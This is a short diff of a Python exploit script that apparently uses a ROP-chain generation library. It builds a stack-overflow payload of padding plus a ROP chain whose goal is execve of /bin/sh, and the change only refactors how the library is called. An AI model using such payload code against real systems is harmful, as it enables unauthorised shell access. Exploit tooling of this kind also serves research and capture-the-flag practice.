@@ -16,8 +16,7 @@ goals = [
   ["execve", "/bin/sh"]
 ]
 
-goal_resolver = goal.create_from_arguments(files, [], goals)
-rop = ropme.rop(files, goal_resolver, log_level = logging.DEBUG)
+rop = ropme.rop(files, [], goals, log_level = logging.DEBUG)
 
 payload = 'A'*512 + 'B'*8 + rop
 payload += ((700 - len(payload)) * 'B')
